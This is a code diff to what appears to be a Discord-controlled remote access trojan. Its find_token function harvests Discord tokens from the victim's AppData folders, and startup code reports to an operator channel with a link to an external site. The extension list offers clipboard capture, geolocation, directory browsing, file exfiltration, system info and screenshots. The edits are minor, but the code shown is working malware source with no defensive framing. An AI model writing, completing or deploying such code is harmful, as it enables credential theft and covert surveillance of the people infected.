@@ -43,7 +43,7 @@ def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, 
     return embed
 
 def find_token(self):
-    tokens = realTokens = []
+    tokens = []
     local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
     paths = {
         "Lightcord": roaming + "\\Lightcord",
@@ -64,11 +64,7 @@ def find_token(self):
                             tokens.append(token)
         except FileNotFoundError: continue
 
-    for t in tokens:
-        if t.isascii(): 
-            realTokens.append(t)
-
-    return realTokens
+    return tokens
 
 #> custom bot implementation  
 
@@ -109,7 +105,7 @@ async def on_ready():
         url=r"http://null337.rf.gd/", 
         icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
     ).set_footer(
-        text = f"Identifier: " + client.identifier + " | Startup:"
+        text = f"Identifier: " + client.identifier 
     )
     await client.get_channel(notification_channel).send(embed=embed)    
 
@@ -181,7 +177,7 @@ extensions = (
     "clipboard",      # /get_clipboard
     "geolocate",      # /get_geolocation
     "directory",      # /get_currentdir & /set_currentdir & /list_directory & /list_rawdir
-    "rawtokens",      # /raw_tokens & /raw_discord
+    "rawTokens",      # /raw_tokens & /raw_discord
     "sendfiles",      # /sendfiles
     "systeminfo",     # /get_systeminfo
     "screenshot",     # /get_screenshot
@@ -191,7 +187,7 @@ extensions = (
 
 for ex in extensions:
     ## For debugging
-    #client.load_extension("modules."+ex)
+    # client.load_extension("modules."+ex)
 
     ## For production
     client.load_extension(ex) 
